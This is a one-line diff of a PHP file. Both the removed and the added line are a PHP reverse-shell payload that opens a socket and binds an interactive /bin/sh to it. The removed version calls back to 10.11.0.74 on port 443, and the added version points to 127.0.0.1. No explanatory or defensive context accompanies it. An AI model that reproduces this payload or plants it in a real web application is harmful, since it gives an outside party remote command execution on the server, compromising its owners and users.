@@ -1,1 +1,1 @@
-<?php $sock=fsockopen("10.11.0.74",443);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
+<?php $sock=fsockopen("127.0.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
